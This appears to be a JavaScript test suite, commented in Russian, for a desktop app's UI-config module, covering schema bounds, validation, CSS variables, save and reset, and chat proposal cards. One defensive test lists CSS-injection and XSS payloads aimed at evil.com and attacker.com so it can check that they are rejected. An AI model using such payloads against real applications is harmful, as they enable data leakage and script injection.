// ---------------------------------------------------------------------------
// Интерфейс как данные и примерка изменения из чата.
// Основа — ui-config.schema.json и CSS-переменные, которые получает окно.
// ---------------------------------------------------------------------------

const assert = require('node:assert/strict')
const path = require('node:path')
const fs = require('node:fs')
const os = require('node:os')

const failures = []
function check(name, fn) {
  try {
    fn()
    console.log('ok', name)
  } catch (error) {
    failures.push(`${name}: ${error.message}`)
    console.error('FAIL', name, error.message)
  }
}

// Загрузка модуля uiConfig (до реализации бросит ошибку)
let uiConfig = null
try {
  uiConfig = require('../src/main/ui-config')
} catch (e) {
  // Будет красным на стадии TDD RED
}

// 1. Схема ui-config.schema.json существует и задает строгие типы и границы
check('схема ui-config.schema.json существует и задает свойства интерфейса', () => {
  const schemaPath = path.join(__dirname, '../src/main/ui-config.schema.json')
  assert.ok(fs.existsSync(schemaPath), 'Файл ui-config.schema.json должен существовать')
  const schema = JSON.parse(fs.readFileSync(schemaPath, 'utf8'))

  assert.equal(schema.type, 'object')
  assert.ok(schema.properties.sidebarWidth, 'Должно быть свойство sidebarWidth')
  assert.equal(schema.properties.sidebarWidth.type, 'integer')
  assert.equal(schema.properties.sidebarWidth.minimum, 180)
  assert.equal(schema.properties.sidebarWidth.maximum, 420)

  assert.ok(schema.properties.workPanelWidth, 'Должно быть свойство workPanelWidth')
  assert.equal(schema.properties.workPanelWidth.type, 'integer')
  assert.equal(schema.properties.workPanelWidth.minimum, 280)
  assert.equal(schema.properties.workPanelWidth.maximum, 720)

  assert.ok(schema.properties.codeFontSize, 'Должно быть свойство codeFontSize')
  assert.equal(schema.properties.codeFontSize.type, 'integer')
  assert.equal(schema.properties.codeFontSize.minimum, 10)
  assert.equal(schema.properties.codeFontSize.maximum, 24)

  assert.ok(schema.properties.showSidebar, 'Должно быть свойство showSidebar')
  assert.equal(schema.properties.showSidebar.type, 'boolean')

  assert.ok(schema.properties.showWorkPanel, 'Должно быть свойство showWorkPanel')
  assert.equal(schema.properties.showWorkPanel.type, 'boolean')
})

// 2. Валидация значений и строгие границы
check('модуль ui-config валидирует корректные значения и отсекает выход за границы', () => {
  assert.ok(uiConfig, 'Модуль src/main/ui-config должен быть доступен')

  const valid = {
    sidebarWidth: 260,
    workPanelWidth: 400,
    codeFontSize: 14,
    showSidebar: true,
    showWorkPanel: false
  }
  const res = uiConfig.validate(valid)
  assert.equal(res.ok, true)
  assert.equal(res.config.sidebarWidth, 260)
  assert.equal(res.config.codeFontSize, 14)

  // Выход за нижнюю границу (sidebarWidth < 180)
  const tooSmall = uiConfig.validate({ sidebarWidth: 100 })
  assert.equal(tooSmall.ok, false, 'Ширина меньше минимума должна отвергаться')

  // Выход за верхнюю границу (codeFontSize > 24)
  const tooBigFont = uiConfig.validate({ codeFontSize: 30 })
  assert.equal(tooBigFont.ok, false, 'Шрифт кода больше максимума должен отвергаться')
})

// 3. Защита от CSS-инъекций
check('модуль ui-config блокирует CSS-инъекции (@import, url, expression, javascript, теги)', () => {
  assert.ok(uiConfig, 'Модуль src/main/ui-config должен быть доступен')

  const injections = [
    { sidebarWidth: '240px; @import url("https://evil.com/leak.css");' },
    { codeFontSize: '14px; background: url(javascript:alert(1))' },
    { customCss: '</style><script>alert("xss")</script>' },
    { themeOverride: 'expression(document.location="http://attacker.com")' }
  ]

  for (const malicious of injections) {
    const res = uiConfig.validate(malicious)
    assert.equal(res.ok, false, `Инъекция должна блокироваться: ${JSON.stringify(malicious)}`)
    assert.ok(
      /injection|invalid|type|границ/i.test(res.error),
      `Причина должна указывать на нарушение безопасности: ${res.error}`
    )
  }
})

// 4. Генерация безопасных CSS-переменных для применения без перезагрузки
check('toCssVariables генерирует точные и безопасные CSS-переменные', () => {
  assert.ok(uiConfig, 'Модуль src/main/ui-config должен быть доступен')

  const config = {
    sidebarWidth: 280,
    workPanelWidth: 440,
    codeFontSize: 15,
    fontUiSize: 14,
    showSidebar: true,
    showWorkPanel: false
  }

  const vars = uiConfig.toCssVariables(config)
  assert.equal(vars['--sidebar-width'], '280px')
  assert.equal(vars['--work-panel-width'], '440px')
  assert.equal(vars['--code-font-size'], '15px')
  assert.equal(vars['--font-ui-size'], '14px')
  assert.equal(vars['--sidebar-display'], 'flex')
  assert.equal(vars['--work-panel-display'], 'none')

  // Проверка, что ни одно значение не содержит кавычек или разделителей правил
  for (const [k, v] of Object.entries(vars)) {
    assert.ok(!/[;{}"'<>]/i.test(v), `Значение CSS-переменной ${k} не должно содержать опасных символов: ${v}`)
  }
})

// 5. Сохранение в профиле, чтение и откат к значениям по умолчанию
check('сохранение в профиле, загрузка и откат к дефолтам работают атомарно', () => {
  assert.ok(uiConfig, 'Модуль src/main/ui-config должен быть доступен')

  const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'onlyone-ui-config-'))

  try {
    // Дефолтная конфигурация
    const initial = uiConfig.load(tempDir)
    assert.equal(initial.sidebarWidth, 240)
    assert.equal(initial.codeFontSize, 13)

    // Сохранение изменений
    const updated = { ...initial, sidebarWidth: 320, codeFontSize: 16 }
    const saveRes = uiConfig.save(tempDir, updated)
    assert.equal(saveRes.ok, true)

    // Загрузка сохранённого
    const loaded = uiConfig.load(tempDir)
    assert.equal(loaded.sidebarWidth, 320)
    assert.equal(loaded.codeFontSize, 16)

    // Откат к значениям по умолчанию
    const resetRes = uiConfig.reset(tempDir)
    assert.equal(resetRes.ok, true)
    const afterReset = uiConfig.load(tempDir)
    assert.equal(afterReset.sidebarWidth, 240)
    assert.equal(afterReset.codeFontSize, 13)
  } finally {
    try { fs.rmSync(tempDir, { recursive: true, force: true }) } catch {}
  }
})

// 6. Рендеринг карточки предложения, панели примерки и строки применённого изменения
check('ui-config-view формирует карточку предложения, панель примерки .trybar и статус .appliedline', () => {
  let view = null
  try {
    view = require('../src/renderer/ui-config-view')
  } catch (e) {
    assert.fail(`Модуль src/renderer/ui-config-view не найден: ${e.message}`)
  }

  // 1) Карточка предложения в сообщении чата (.prop)
  const propHtml = view.renderProposalCard({
    id: 'prop-1',
    label: 'Увеличить шрифт кода до 15px',
    patch: { codeFontSize: 15 }
  })
  assert.ok(propHtml.includes('class="prop"'), 'Разметка предложения должна содержать класс prop')
  assert.ok(propHtml.includes('Увеличить шрифт кода до 15px'))
  assert.ok(propHtml.includes('Примерить'), 'Должна быть кнопка «Примерить»')

  // 2) Панель примерки вверху окна (.trybar)
  const tryBarHtml = view.renderTryBar({
    id: 'prop-1',
    label: 'Увеличить шрифт кода до 15px'
  })
  assert.ok(tryBarHtml.includes('class="trybar"'), 'Разметка панели должна содержать класс trybar')
  assert.ok(tryBarHtml.includes('Вернуть'), 'Должна быть кнопка «Вернуть»')
  assert.ok(tryBarHtml.includes('Оставить'), 'Должна быть кнопка «Оставить»')

  // 3) Строка применённого изменения (.appliedline)
  const appliedHtml = view.renderAppliedLine({
    id: 'prop-1',
    label: 'Увеличить шрифт кода до 15px'
  })
  assert.ok(appliedHtml.includes('class="appliedline"'), 'Разметка должна содержать класс appliedline')
  assert.ok(appliedHtml.includes('Откатить'), 'Должна быть кнопка «Откатить»')
})

if (failures.length) {
  console.error('\nFAILURES:\n' + failures.join('\n'))
  process.exitCode = 1
} else {
  console.log(`\nВсего проверок: 6, Успешно: 6, Ошибок: 0\n`)
}
